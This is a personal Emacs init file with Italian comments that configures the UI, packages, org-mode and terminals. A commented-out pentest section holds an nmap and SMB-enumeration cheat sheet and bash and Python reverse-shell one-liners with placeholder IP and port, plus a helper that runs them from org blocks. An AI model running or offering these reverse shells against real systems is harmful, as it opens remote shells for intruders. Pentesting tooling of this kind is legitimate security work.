;; Author: Andrea Gelmi
;; Prerequisites:
;; Tools to install: cmake, libtool, libtool-bin (Debian/Ubuntu) o libtool-dev
;; Font: ttc-iosevka (Arch) o fonts-iosevka (Debian/Ubuntu)

;; Disattiva schermata di benvenuto
(setq inhibit-startup-message t)
;; Disabilita package.el automatico per evitare conflitti con straight.el
(setq package-enable-at-startup nil)

;; Sopprimi warning di compilazione nativi
(setq native-comp-async-report-warnings-errors nil)
(setq warning-minimum-level :error)

;; Sopprimi warning yasnippet backquote-change
(setq warning-suppress-types 
      (cons '(yasnippet backquote-change) 
            (if (boundp 'warning-suppress-types) 
                warning-suppress-types 
              nil)))


;; ;; Imposta la trasparenza al 96%
;; (set-frame-parameter (selected-frame) 'alpha '(96 . 96))
;; (add-to-list 'default-frame-alist '(alpha . (96 . 96)))

;; UI più pulita
(menu-bar-mode -1)
(tool-bar-mode -1)
(scroll-bar-mode -1)
;; (setq-default mode-line-format nil)
;; (setq mode-line-format nil)

;; Conta righe a sinistra
(global-display-line-numbers-mode -1)

;; Disabilita evidenziazione riga corrente
(global-hl-line-mode -1)

;; Beep FASTIDIOSISSIMO
(setq ring-bell-function 'ignore)

;; Risposte brevi a yes/no
(fset 'yes-or-no-p 'y-or-n-p)

;; Aumenta leggibilità con spaziatura tra righe
(setq-default line-spacing 3)

;; Bootstrap straight.el (compatibile con tutte le versioni recenti)
(defvar bootstrap-version)
(let ((bootstrap-file
       (expand-file-name "straight/repos/straight.el/bootstrap.el" user-emacs-directory))
      (bootstrap-version 6))
  (unless (file-exists-p bootstrap-file)
    ;; Assicurati che il modulo url sia caricato
    (require 'url)
    (with-current-buffer
        (url-retrieve-synchronously
         "https://raw.githubusercontent.com/radian-software/straight.el/develop/install.el"
         'silent 'inhibit-cookies)
      (goto-char (point-max))
      (eval-print-last-sexp)))
  (load bootstrap-file nil 'nomessage))


;; Integra straight.el con use-package
(straight-use-package 'use-package)


;; dark high contrast theme
;; (use-package modus-themes
;;   :straight t
;;   :config
;;   ;; Imposta override prima di caricare il tema
;;   (setq modus-themes-common-palette-overrides
;;         '((bg-mode-line-active bg-blue-intense)  
;;           (fg-mode-line-active fg-main)
;;           (border-mode-line-active bg-blue-intense))) 

;;   ;; Carica il tema
;;   (load-theme 'modus-vivendi t))


;; Disabilita package.el all'avvio
;; (setq package-enable-at-startup nil)

;; (use-package spacemacs-theme
;;   :straight t
;;   :config
;;   (load-theme 'spacemacs-dark t))


(set-face-attribute 'region nil :background "#453d41" :foreground nil)

;; ;; Font
(when (display-graphic-p)
  (set-face-attribute 'default nil
                      :font "Liberation Mono" ;; Previous font: Liberation Mono
                      :height 125
                      :weight 'regular))


;; Dimensioni finestra all'avvio
(add-to-list 'default-frame-alist '(width . 185))
(add-to-list 'default-frame-alist '(height . 50))

;; Rimuovi bordi interni della finestra
(fringe-mode 0)

;; Rimuovi bordo esterno della finestra
(when (display-graphic-p)
  (set-frame-parameter nil 'internal-border-width 0)
  (add-to-list 'default-frame-alist '(internal-border-width . 0)))

;; Imposta layout tastiera italiana (solo su Linux)
(when (eq system-type 'gnu/linux)
  (start-process "setxkbmap" nil "/usr/bin/setxkbmap" "-layout" "it"))


;; ============================================================================
;; MIGLIORAMENTI GENERALI
;; ============================================================================

;; ;; DOOM-MODELINE - barra di stato moderna
(use-package doom-modeline
  :straight t
  :init
  ;; Attiva doom-modeline
  (doom-modeline-mode 1)

;; Imposta l'altezza della modeline (facoltativo)
  (setq doom-modeline-height 25)

  :config
  ;; Fix per errore SVG su macOS Ventura (se necessario)
  (add-to-list 'image-types 'svg)
    
  ;; Personalizza i colori della modeline (Doom Modeline)
  (set-face-attribute 'mode-line nil
                      :background "#33144f"  ; <--- NUOVO COLORE (Viola più scuro/smorzato)
                      :foreground "#ffffff") ; testo bianco

  (set-face-attribute 'mode-line-inactive nil
                      :background "#0F1E2E"  ; blu molto scuro per inattiva
                      :foreground "#0F1E2E")) ; testo grigio



;; Non chiedere conferma per chiudere processi
(setq confirm-kill-processes nil)

;; Aumenta limite undo
(setq undo-limit 20000000)
(setq undo-strong-limit 40000000)

;; Split sempre verticale
(setq split-width-threshold nil)

;; Smooth scroll
(setq scroll-step 3)

;; Mostra numero colonna
(column-number-mode)
(global-visual-line-mode)

;; Non aggiungere newline alla fine
(setq next-line-add-newlines nil)
(setq-default truncate-lines t)
(setq truncate-partial-width-windows nil)

;; Configurazione tab e indentazione
(setq-default tab-stop-list nil)
(setq-default indent-tabs-mode nil)
(setq-default standard-indent 2)

;; Preferisci UTF-8
(prefer-coding-system 'utf-8-unix)

;; Auto-save configuration
(unless (file-exists-p "~/.emacs.d/.auto_saves/")
  (make-directory "~/.emacs.d/.auto_saves/"))

(setq make-backup-files nil
      auto-save-default t
      auto-save-timeout 1
      auto-save-interval 300
      auto-save-file-name-transforms '((".*" "~/.emacs.d/.auto_saves/" t))
      create-lockfiles nil)




;; ============================================================
;; PENTEST Macros
;; ============================================================

;; ;;; Aggiungi la cartella dove si trova icheat.el
;; (add-to-list 'load-path "~/.emacs.d/lisp/")
;; (require 'icheat)

;; ;; Definisci la variabile richiesta dalla macro
;; (defvar my/tool-cmd-list nil
;;   "Lista dei tool command definiti.")

;; ;; Definizioni dei comandi
;; (icheat-def-cmd
;;  "nmap"
;;  t
;;  (("standard"       . "nmap -sC -sV --min-rate 1000 %ip")
;;   ("full-tcp-ports" . "nmap -p- --min-rate 1000 %ip")
;;   ("standard-ad"    . "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,54296 -sCV %ip")))

;; (icheat-def-cmd
;;  "smb"
;;  t
;;  (("guest-access"        . "netexec smb %domain -u guest -p '' --shares")
;;   ("anonymous-access"    . "netexec smb %domain --shares")
;;   ("smbclient anonymous" . "smbclient -N //%domain/%share")))

;; (icheat-def-cmd
;;  "reverse"
;;  t
;;  (("bash-1"   . "bash -i >& /dev/tcp/%ip/%port 0>&1")
;;   ("bash-2"   . "bash -c \"bash -i >& /dev/tcp/%ip/%port 0>&1\"")
;;   ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))

;; ;; Lista dei tool disponibili
;; (defvar icheat-available-tools
;;   '("nmap" "smb" "reverse")
;;   "Lista dei tool disponibili per il completamento 'cmd'.")

;; (defun icheat-org-run-cmd-async ()
;;   "Prompt per selezionare tool/variante, inserisce blocchi Org e esegue comando in modo asincrono."
;;   (interactive)
;;   (let* ((tool (completing-read "Tool: " icheat-available-tools))
;;          (func (intern (concat "icheat-cmd-" tool)))
;;          (cmd (funcall func t))
;;          (buf (current-buffer))
;;          cmd-marker
;;          output-marker)
    
;;     ;; Inserisci blocco COMANDO
;;     (insert "#+begin_src\n")
;;     (insert cmd "\n")
;;     (insert "#+end_src\n\n")
    
;;     ;; Inserisci blocco OUTPUT (vuoto per ora)
;;     (insert "#+begin_src\n")
;;     (setq output-marker (point-marker))
;;     (insert "\n#+end_src\n")
    
;;     ;; Esegui comando in modo asincrono
;;     (let ((proc (start-process-shell-command
;;                  "icheat-cmd" 
;;                  (generate-new-buffer "*icheat-output*")
;;                  cmd)))
      
;;       ;; Quando il comando termina, inserisci l'output
;;       (set-process-sentinel
;;        proc
;;        `(lambda (process event)
;;           (when (string-match-p "finished" event)
;;             (let ((output (with-current-buffer (process-buffer process)
;;                             (buffer-string))))
;;               (with-current-buffer ,buf
;;                 (save-excursion
;;                   (goto-char ,output-marker)
;;                   (insert output)))
;;               (kill-buffer (process-buffer process))
;;               (message "Comando completato!"))))))))

;; ;; Configurazione yasnippet
;; (use-package yasnippet
;;   :straight t
;;   :config
;;   (yas-global-mode 1))

;; ;; Definisci lo snippet per org-mode
;; (with-eval-after-load 'yasnippet
;;   (let ((snippet-dir (expand-file-name "snippets/org-mode" user-emacs-directory)))
;;     (unless (file-exists-p snippet-dir)
;;       (make-directory snippet-dir t))
    
;;     (with-temp-file (expand-file-name "cmd" snippet-dir)
;;       (insert "# -*- mode: snippet -*-\n")
;;       (insert "# name: iCheat command block\n")
;;       (insert "# key: cmd\n")
;;       (insert "# --\n")
;;       (insert "${1:`(progn (icheat-org-run-cmd-async) \"\")`}"))
    
;;     (yas-reload-all)))

;; (message "iCheat Org integration (asincrona) loaded.")


;; ============================================================
;; ORG-MODE BASIC SETTINGS
;; ============================================================

(setq org-ellipsis " ...")
(setq org-hide-emphasis-markers t)
(setq org-startup-with-inline-images t)
(setq org-image-actual-width nil)
(setq org-adapt-indentation t)
(setq org-src-preserve-indentation t)

;; ============================================================
;; KEYBINDINGS
;; ============================================================

(with-eval-after-load 'org
  (define-key org-mode-map (kbd "C-c i") 'icheat-org-insert-block))



;; ===============================
;; PROGRAMMING
;; ===============================
(use-package ztree
  :straight t
  :config
  (setq ediff-split-window-function 'split-window-horizontally)
  (setq ediff-window-setup-function 'ediff-setup-windows-plain)
  (setq ediff-keep-variants nil)
  (setq ztree-diff-additional-options '("-w" "-i")))

(setq treesit-language-source-alist
      '((bash "https://github.com/tree-sitter/tree-sitter-bash")
        (cmake "https://github.com/uyha/tree-sitter-cmake")
        (css "https://github.com/tree-sitter/tree-sitter-css")
        (c "https://github.com/tree-sitter/tree-sitter-c")
        (cpp "https://github.com/tree-sitter/tree-sitter-cpp")
        (elisp "https://github.com/Wilfred/tree-sitter-elisp")
        (go "https://github.com/tree-sitter/tree-sitter-go")
        (html "https://github.com/tree-sitter/tree-sitter-html")
        (javascript "https://github.com/tree-sitter/tree-sitter-javascript" "master" "src")
        (json "https://github.com/tree-sitter/tree-sitter-json")
        (make "https://github.com/alemuller/tree-sitter-make")
        (markdown "https://github.com/ikatyang/tree-sitter-markdown")
        (python "https://github.com/tree-sitter/tree-sitter-python")
        (toml "https://github.com/tree-sitter/tree-sitter-toml")
        (tsx "https://github.com/tree-sitter/tree-sitter-typescript" "master" "tsx/src")
        (typescript "https://github.com/tree-sitter/tree-sitter-typescript" "master" "typescript/src")
        (yaml "https://github.com/ikatyang/tree-sitter-yaml")
        (java "https://github.com/tree-sitter/tree-sitter-java")))

(use-package tree-sitter
  :straight t
  :config
  (global-tree-sitter-mode)
  (add-to-list 'tree-sitter-major-mode-language-alist '(typescript-ts-mode . typescript))
  (add-to-list 'tree-sitter-major-mode-language-alist '(c-ts-mode . c))
  (add-hook 'tree-sitter-after-on-hook #'tree-sitter-hl-mode))

(use-package tree-sitter-langs
  :straight t
  :after tree-sitter)


;; ============================================================================
;; ORG-MODE
;; ============================================================================

(setq org-ellipsis " ...")
(setq org-hide-emphasis-markers t)
(setq org-startup-with-inline-images t)

(setq org-ellipsis " ...")
(setq org-hide-emphasis-markers t)
(setq org-startup-with-inline-images t)
(setq org-image-actual-width nil)
(setq org-adapt-indentation t)
(setq org-src-preserve-indentation t)

;; Todo keywords colorati
(setq org-todo-keywords '((sequence "TODO" "DOING" "|" "DONE" "ARCHIVED")))
(setq org-todo-keyword-faces
      '(("TODO" . "BlueViolet")
        ("DOING" . "yellow")
        ("DONE" . "LawnGreen")
        ("ARCHIVED" . "RoyalBlue")))

;; Cripta sezioni con tag :crypt:
(with-eval-after-load 'org
  (require 'org-tempo) ;; <- <s + tab for example block
  (require 'org-crypt)
  (require 'epa-file)
  
  (epa-file-enable)
  (org-crypt-use-before-save-magic)
  (setq org-tags-exclude-from-inheritance '("crypt"))
  (setq org-crypt-key nil)
  
  ;; Babel per eseguire codice
(with-eval-after-load 'org
  (require 'ob-C)
  (org-babel-do-load-languages
   'org-babel-load-languages
   '((python . t)
     (shell . t)
     (C . t)
     (lisp . t))))


  
  ;; Refile targets
  (setq org-refile-targets '((nil :maxlevel . 3)))
  (setq org-refile-use-outline-path 'file)
  (setq org-outline-path-complete-in-steps nil))

;; Funzioni Org-mode
(defun my/org-insert-image ()
  "Chiede un percorso e inserisce l'immagine in Org-mode mostrandola subito."
  (interactive)
  (let ((img (read-file-name "Select an image: " "~/")))
    (insert (format "[[%s]]" img))
    (org-display-inline-images)))

(defun my/org-insert-example-block ()
  "Inserisce un blocco #+BEGIN_SRC ... #+END_SRC in Org-mode."
  (interactive)
  (insert "#+begin_src\n")
  (save-excursion
    (insert "\n#+end_src\n")))

(defun my/org-export-md-pandoc ()
  "Esporta il buffer Org corrente in Markdown usando Pandoc."
  (interactive)
  (let ((output-file (concat (file-name-sans-extension (buffer-file-name)) ".md")))
    (shell-command (format "pandoc -f org -t gfm %s -o %s"
                           (shell-quote-argument (buffer-file-name))
                           (shell-quote-argument output-file)))
    (message "Esportato in Markdown: %s" output-file)))

(defun my/vterm-below ()
  "Apre un buffer vterm in una finestra sotto quella corrente."
  (interactive)
  (let ((buf (generate-new-buffer-name "*vterm*")))
    (split-window-below -10)  ; -15 significa 15 righe dal basso
    (other-window 1)
    (vterm buf)))

(global-set-key (kbd "C-c v") 'my/vterm-below)

;; Aggiungi questo keybinding nella sezione KEYBINDINGS
(global-set-key (kbd "C-c v") 'my/vterm-below)

(defun my/org-export-html ()
  "Esporta il buffer Org corrente in HTML."
  (interactive)
  (org-html-export-to-html)
  (message "Esportato in HTML"))


(defun my/open-browser ()
  "Menu per aprire Chromium in diverse modalità."
  (interactive)
  (let ((choice (completing-read "Select browser mode: "
                                  '("anon" "admin" "proxy")
                                  nil t)))
    (cond
     ((string= choice "anon")
      (start-process "chromium-anon" nil "chromium" "--incognito"))
     
     ((string= choice "admin")
      (start-process "chromium-admin" nil "chromium"))
     
     ((string= choice "proxy")
      (let ((proxy-addr (read-string "Proxy address (host:port): " "127.0.0.1:8080")))
        (start-process "chromium-proxy" nil "chromium"
                       "--incognito"
                       (format "--proxy-server=%s" proxy-addr)))))))

(global-set-key (kbd "C-c b") 'my/open-browser)


;; ============================================================================
;; EVIDENZIAZIONE TODO/NOTE/IMPORTANT NEL CODICE
;; ============================================================================
;; Nascondi keyword org-mode
(add-hook 'org-mode-hook
          (lambda ()
            (push '("#+TITLE: " . "") prettify-symbols-alist)
            (push '("#+SUBTITLE: " . "") prettify-symbols-alist)
            (push '("#+AUTHOR: " . "") prettify-symbols-alist)
            (push '("#+DATE: " . "") prettify-symbols-alist)
            (push '("#+EMAIL: " . "") prettify-symbols-alist)
            (prettify-symbols-mode 1)))

(setq fixme-modes '(c++-mode c-mode emacs-lisp-mode python-mode))
(make-face 'font-lock-fixme-face)
(make-face 'font-lock-note-face)
(make-face 'font-lock-important-face)

(mapc (lambda (mode)
        (font-lock-add-keywords
         mode
         '(("\\<\\(TODO\\)" 1 'font-lock-fixme-face t)
           ("\\<\\(IMPORTANT\\)" 1 'font-lock-important-face t)
           ("\\<\\(NOTE\\)" 1 'font-lock-note-face t))))
      fixme-modes)

(modify-face 'font-lock-fixme-face "Magenta" nil nil t nil t nil nil)
(modify-face 'font-lock-important-face "Red" nil nil t nil t nil nil)
(modify-face 'font-lock-note-face "DeepSkyBlue" nil nil t nil t nil nil)

;; ============================================================================
;; PACCHETTI
;; ============================================================================

;; MAGIT - Gestione Git
(use-package magit
  :straight t
  :bind (("C-x g" . magit-status)))

;; VTERM
(use-package vterm
  :straight t
  :commands vterm
  :config
  (setq vterm-shell "/bin/bash")
  (setq vterm-max-scrollback 100000)

  ;; BLOCCA DEFINITIVAMENTE LO ZOOM DI VTERM
  (add-hook 'vterm-mode-hook
            (lambda ()
              (setq-local vterm-font-scale 0)))

  ;; Disabilita le scorciatoie di zoom in vterm
  (define-key vterm-mode-map (kbd "C-+") nil)
  (define-key vterm-mode-map (kbd "C--") nil)
  (define-key vterm-mode-map (kbd "C-=") nil)

  ;; Tracking directory
  (add-hook 'vterm-mode-hook
            (lambda ()
              (setq-local vterm-directory-track t)))

  ;; Resize finestra
  (define-key vterm-mode-map (kbd "C-<up>") 'enlarge-window)
  (define-key vterm-mode-map (kbd "C-<down>") 'shrink-window)
  (define-key vterm-mode-map (kbd "C-<right>") 'enlarge-window-horizontally)
  (define-key vterm-mode-map (kbd "C-<left>") 'shrink-window-horizontally))




;; MULTI-VTERM - Gestione terminali multipli
(use-package multi-vterm
  :straight t)



(defun my/new-vterm ()
  "Apre una nuova finestra con una sessione vterm."
  (interactive)
  (vterm (generate-new-buffer-name "*vterm*")))

(add-hook 'vterm-mode-hook
          (lambda ()
            (display-line-numbers-mode -1)
            (hl-line-mode -1)
            (visual-line-mode -1)))

;; Apri automaticamente vterm all'avvio di Emacs
(add-hook 'emacs-startup-hook
          (lambda ()
            (delete-other-windows)
            (dolist (buf (buffer-list))
              (unless (string-match-p "\\*vterm\\*" (buffer-name buf))
                (kill-buffer buf)))
            (vterm)))

;; IVY
(use-package ivy
  :straight t
  :demand t
  :diminish
  :init
  (ivy-mode 1)
  :config
  (setq ivy-re-builders-alist
        '((t . ivy--regex-fuzzy))) ;; fuzzy search per tutti
  (setq ivy-use-virtual-buffers nil)
  (setq enable-recursive-minibuffers t)
  (setq ivy-height 15))

;; load ivy-postframe
(use-package ivy-posframe
  :straight t
  :demand t
  :after ivy
  :config
  (setq ivy-posframe-display-functions-alist '((t . ivy-posframe-display-at-frame-center))
        ivy-posframe-width 120
        ivy-posframe-height 10
        ivy-posframe-border-width 1
        ivy-posframe-parameters '((left-fringe . 8)
                                  (right-fringe . 8)))

  ;; Rimuovi eventuali override precedenti
  (set-face-attribute 'ivy-posframe nil
                      :background nil
                      :foreground nil
                      :inherit 'default)

  (set-face-attribute 'child-frame-border nil
                      :background nil)

  ;; FIX: Resetta lo scaling nel buffer di ivy-posframe
  (defun my/ivy-posframe-fix-text-scale (buffer-or-name)
    (when (buffer-live-p (get-buffer buffer-or-name))
      (with-current-buffer buffer-or-name
        (text-scale-set 0))))

  (advice-add 'ivy-posframe--display :after
              (lambda (&rest _)
                (my/ivy-posframe-fix-text-scale ivy-posframe-buffer)))

  (ivy-posframe-mode 1))

;; FIX: Aggiorna i colori di ivy-posframe dopo che il tema è caricato
(add-hook 'after-init-hook
          (lambda ()
            (set-face-attribute 'ivy-posframe nil
                                :background nil
                                :foreground nil
                                :inherit 'default))

  (ivy-posframe-mode 1))


;; DENOTE - Sistema di note
(use-package denote
  :straight t
  :config
  (setq denote-directory (expand-file-name "~/notes/denote"))
  (setq denote-save-buffers nil)
  (setq denote-known-keywords
        '("emacs" "progetti" "programmazione" "libri" "matematica" 
          "vita" "scrittura" "network" "film" "sicurezza" "sistema" "strumenti"))
  (setq denote-infer-keywords t)
  (setq denote-sort-keywords t)
  (setq denote-file-type nil)
  (setq denote-prompts '(title keywords))
  (denote-rename-buffer-mode 1)
  (add-hook 'dired-mode-hook #'denote-dired-mode-in-directories))

;; UTILS


;; ============================================================================
;; UTILITY
;; ============================================================================

(defun my/find-file-here ()
  "Apre Ivy per cercare un file nella directory corrente."
  (interactive)
  (message "Current Directory: %s" default-directory)
  (call-interactively 'find-file))

(defun my/text-bigger ()
  "Aumenta la dimensione del testo."
  (interactive)
  (text-scale-increase 1)
  (message "enlarged text"))

(defun my/text-smaller ()
  "Diminuisce la dimensione del testo."
  (interactive)
  (text-scale-decrease 1)
  (message "reduced text"))

;; Assicurati di avere transient
(use-package transient
  :straight t)



;; ============================================================================
;; KEYBINDINGS
;; ============================================================================


;; File
(global-set-key (kbd "C-c f") 'my/find-file-here)

;; Testo
(global-set-key (kbd "C-+") 'my/text-bigger)
(global-set-key (kbd "C--") 'my/text-smaller)

;; Terminale
(global-set-key (kbd "C-c t") 'multi-vterm)

;; Editing
(global-set-key (kbd "C-c q") 'query-replace)
(global-set-key (kbd "C-c m") 'comment-region)
(global-set-key (kbd "C-c n") 'uncomment-region)

;; Git
(global-set-key (kbd "C-x g") 'magit-status)

;; Tool menu

;; Org-mode
(with-eval-after-load 'org
  (define-key org-mode-map (kbd "C-u") 'my/org-insert-image)
  (define-key org-mode-map (kbd "C-c m") 'my/org-export-md-pandoc)
  (define-key org-mode-map (kbd "C-c h") 'my/org-export-html))

;; ============================================================================
;; HOOKS
;; ============================================================================
;; (add-hook 'prog-mode-hook #'display-line-numbers-mode)
;; (add-hook 'conf-mode-hook #'display-line-numbers-mode)

(add-hook 'dired-mode-hook 'auto-revert-mode)

;; ============================================================================
;; CUSTOM VARIABLES
;; ============================================================================

(custom-set-variables
 ;; custom-set-variables was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 '(custom-enabled-themes '(modus-vivendi))
 '(custom-safe-themes
   '("6dcf1ca4c7432773084b9d52649ee5eb2c663131c4c06859f648dea98d9acb3e" "bffa9739ce0752a37d9b1eee78fc00ba159748f50dc328af4be661484848e476" "e13beeb34b932f309fb2c360a04a460821ca99fe58f69e65557d6c1b10ba18c7" default))
 '(package-selected-packages
   '(denote multi-vterm vterm magit ivy-posframe ivy spacemacs-theme)))

(custom-set-faces
 ;; custom-set-faces was added by Custom.
 ;; If you edit it by hand, you could mess it up, so be careful.
 ;; Your init file should contain only one such instance.
 ;; If there is more than one, they won't work right.
 )
